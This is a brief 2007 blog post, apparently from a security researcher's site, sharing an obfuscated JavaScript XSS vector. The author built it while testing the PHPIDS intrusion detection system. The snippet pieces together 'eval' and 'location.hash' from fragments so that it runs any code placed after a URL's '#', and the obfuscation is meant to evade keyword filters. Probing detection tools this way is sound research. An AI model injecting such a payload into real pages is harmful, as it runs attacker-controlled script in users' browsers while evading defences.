---
layout: post
status: publish
published: true
title: Obfuscated fun
wordpress_id: 263
wordpress_url: http://pro.grammatic.org/post-obfuscated-fun-37.aspx
date: !binary |-
  MjAwNy0wNy0wNSAyMDoyNzo1MyArMDIwMA==
date_gmt: !binary |-
  MjAwNy0wNy0wNSAyMDoyNzo1MyArMDIwMA==
categories:
- Technology
- InfoSec
tags:
- information security
- XSS
- Javascript
comments: []
doi: "https://doi.org/10.59348/9q33n-5pk20"
archive: "https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2007/07/05/obfuscated-fun"
---
<p>Just thought I'd share the following script vector with you all that I came up with while stressing PHPIDS today:</p>
{% highlight javascript %}
l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 
'loca',d= (k) + (g) + (f),a=0 || (y) + (x),b=1[a](d),c=0 || (m) + (l),1[a](b[c](1));
{% endhighlight %}

<p>Put that inside a script block and believe it or not it will eval the text after the fragment identifier.</p>





